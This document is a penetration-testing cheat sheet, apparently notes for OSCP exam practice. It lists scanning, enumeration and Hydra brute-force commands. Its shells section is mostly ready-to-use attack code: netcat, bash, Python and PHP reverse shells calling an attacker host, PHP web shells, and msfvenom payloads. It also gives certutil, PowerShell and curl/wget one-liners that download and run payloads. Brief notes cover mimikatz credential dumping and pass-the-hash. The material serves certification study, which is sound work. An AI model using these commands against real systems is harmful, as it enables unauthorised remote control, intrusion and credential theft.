## 1. Discovery

### 1.1. Port scan

|Scan|Command|
|---|---|
|Initial network sweep|`nmap -sn $TARGET_RANGE`|
|TCP |`nmap -Pn -sT -A $TARGET_IP`|
|UDP |`nmap -sU -A $TARGET_IP`|

## 2. Enumeration

### 2.1. FTP `21`

```console
lftp anonymous:anonymous@$TARGET -e 'find;quit'
lftp $USERNAME:$PASSWORD@$TARGET -e 'find;quit'
```

### 2.2. HTTP/HTTPS `80`/`443`/`8080`

|   |   |
|---|---|
|Nikto|`nikto -host http://$TARGET:$PORT`|
|dirb|`dirb http://$TARGET:$PORT /usr/share/wordlists/dirb/big.txt`|
|gobuster|`gobuster dir -u http://$TARGET:$PORT -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt`|

#### Wordlists:

dirb:

1. `/usr/share/dirb/wordlists/common.txt` (Default)
2. `/usr/share/wordlists/dirb/big.txt`
3. `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`

SecLists (`/usr/share/seclists/Discovery/Web-Content/`):

1. `/usr/share/seclists/Discovery/Web-Content/combined_words.txt`
2. `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`

### 2.3. SMB `139`/`445`

|   |   |
|---|---|
|Checking for vulnerabilties|`nmap -Pn -p445 --script smb-vuln-* $TARGET`|
|Checking for SambaCry|`nmap -Pn -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version $TARGET`|
|Enumerate using empty username/password|`enum4linux $TARGET`|
|Enumerate with specified username/password|`enum4linux -u $USERNAME -p $PASSWORD $TARGET`|
|List shares using NULL|`smbclient -N -L //$TARGET`|
|List shares using username/password|`smbclient -U '$USERNAME%$PASSWORD' -L //$TARGET`|
|List shares using username/hash|`smbclient -U $USERNAME --pw-nt-hash -L //$TARGET`|
|Connect to share using NULL|`smbclient -N //$TARGET/$SHARE`|
|Connect to share using username/password|`smbclient -U '$USERNAME%$PASSWORD' //$TARGET`|
|Connect to share using username/hash|`smbclient -U $USERNAME --pw-nt-hash //$TARGET`|

### 2.4. LDAP `389`

```console
ldapsearch -b 'DC=lab,DC=vx' -H ldap://192.168.17.11 -D 'CN=Bind Account,CN=Users,DC=lab,DC=vx' -W
```

### 2.5. Brute force (Hydra)

#### RDP/SSH/FTP/SMB/MySQL

|   |   |
|---|---|
|Specify username|`hydra -l $USERNAME -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|
|Use username list|`hydra -L $USERNAME_LIST -P $PASSWORD_LIST $TARGET <rdp/ssh/ftp/smb/mysql>`|

#### Web

Syntax:

`hydra` `-l $USERNAME`/`-L $USERNAME_LIST` `-P $PASSWORD_LIST` `$TARGET` `http-get-form`/`http-post-form` '`$PATH`:`$REQUEST_BODY`:`F=$FAILURE_VERBIAGE`/`S=$SUCCESS_VERBIAGE`:`H=Cookie:$NAME1=$VALUE1;$NAME2=$VALUE2`'

Examples:

```console
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -l admin -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
hydra -L users.txt -P rockyou.txt dvwa.local http-get-form '/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie:PHPSESSID=b9kvhjb7c268tb94445pugm0fa;security=low'
```

#### Wordlists:

1. `/usr/share/wordlists/rockyou`
2. `/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt`
3. `/usr/share/seclists/Usernames/Names/names.txt`

## 3. Shells

### 3.1. Listener

```console
rlwrap nc -nlvp 4444
```

### 3.2. Various reverse shells

#### Netcat Traditional

```console
nc -e /bin/sh $KALI 4444
```

#### Netcat OpenBSD

```console
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Netcat BusyBox

```console
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc $KALI 4444 >/tmp/f
```

#### Bash

```console
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

#### Python

[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$KALI",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

|   |   |
|---|---|
|With `exec`|`php -r '$s=fsockopen("$KALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`|
|With `shell_exec`|`php -r '$s=fsockopen("$KALI",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'`|
|With backticks|``php -r '$s=fsockopen("$KALI",4444);`/bin/sh -i <&3 >&3 2>&3`;'``|
|With `system`|`php -r '$s=fsockopen("$KALI",4444);system("/bin/sh -i <&3 >&3 2>&3");'`|
|With `passthru`|`php -r '$s=fsockopen("$KALI",4444);passthru("/bin/sh -i <&3 >&3 2>&3", "r");'`|
|With `popen`|`php -r '$s=fsockopen("$KALI",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'`|
|With `proc_open`|`php -r '$sock=fsockopen($KALI",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`|

To run in a PHP file: change `php -r '$COMMAND_BLOCK'` to `<?php $COMMAND_BLOCK ?>`

#### PHP web shells

|   |   |
|---|---|
|`<?php echo passthru($_GET['k']);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2021-10-24-Dealer313.md>|
|`<?php system($_GET[base64_decode('Y21k')]);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-17-Vulndc2.md>|
|`<?php echo passthru($_GET['cmd']); ?>`|<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md>|

### 3.3. Payloads

#### MSFVenom reverse shell TCP:

☝️ omit the `x64` to generate a x86 payload

|   |   |
|---|---|
|Linux (Python)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f py -o /var/www/html/reverse.py`|
|Linux (ELF)|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f elf -o /var/www/html/reverse.elf`|
|Windows|`msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe`

#### PowerShell-based reverse shell script:

Download the reverse shell script:

```console
curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
```

Edit the address and port:

```console
sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
sed -i 's/<PORT>/4444/' reverse.ps1
```

### 3.4. Execute payloads

#### Windows: Execute reverse shell TCP payload

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe`|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|

#### Windows: Execute PowerShell-based reverse shell script

☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only

(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)

```cmd
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
```

#### Linux: Execute reverse shell TCP payload

|   |   |
|---|---|
|cURL|`curl -O http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
|Wget|`wget http://kali.vx/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|

### 3.5. Windows direct connection

#### evil-winrm

- WinRM `5985` must be enabled on the target
- User must be a member of `Remote Management Users` on the target

|   |   |
|---|---|
|Username/password|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`|
|Password hashes|`evil-winrm -i #TARGET -u $USERNAME -H $NT_HASH`|

#### impacket-psexec

- The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
- LM hashes are not used from Windows 10 onwards, use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of NULL) to fill the LM hash portion for impacket-psexec or pth-winexe

|   |   |
|---|---|
|Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
|Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|

### 3.6. Upgrade to Full TTY

[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md)

```console
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. File transfers

## 5. Port forwarding

### 5.1. SSH port forwarding

### 5.2. Chisel

## 6. Linux privilege escalation

https://github.com/carlospolop/PEASS-ng/releases

## 7. Windows privilege escalation

https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

https://github.com/carlospolop/PEASS-ng/releases

## 8. Active Directory

AS-REP Roasting

mimikatz lsadump::sam, lsadump::lsa /patch, sekurlsa::logonpasswords

Pass the hash: evil-winrm, impacket-psexec

Kerberoasting

Golden Ticket

## 9. Exam proofs

|OS|Command|
|---|---|
|Linux|`hostname`<br>`cat /path/to/flag/proof.txt`<br>`ifconfig`|
|Windows|`hostname`<br>`type C:\path\to\flag\proof.txt`<br>`ipconfig`|

## 10. References
